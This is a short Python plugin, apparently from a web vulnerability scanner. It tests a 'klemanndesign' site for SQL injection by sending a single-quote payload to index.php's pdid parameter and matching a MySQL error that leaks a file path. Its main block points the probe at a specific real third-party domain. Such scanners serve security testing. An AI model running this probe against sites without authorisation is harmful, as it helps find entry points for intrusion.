#!/usr/bin/env python
import re

def assign(service, arg):
    if service == "klemanndesign":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl(url + 'index.php?pdid=1%27')
    if code == 200:
        m = re.search('supplied argument is not a valid MySQL result resource in <b>([^<]+)</b> on line <b>(\d+)</b>', res)
        if m:
            security_info(m.group(1))

if __name__ == '__main__':
    from dummy import *
    audit(assign('klemanndesign', 'http://www.bmw-veteranenclub.de/')[1])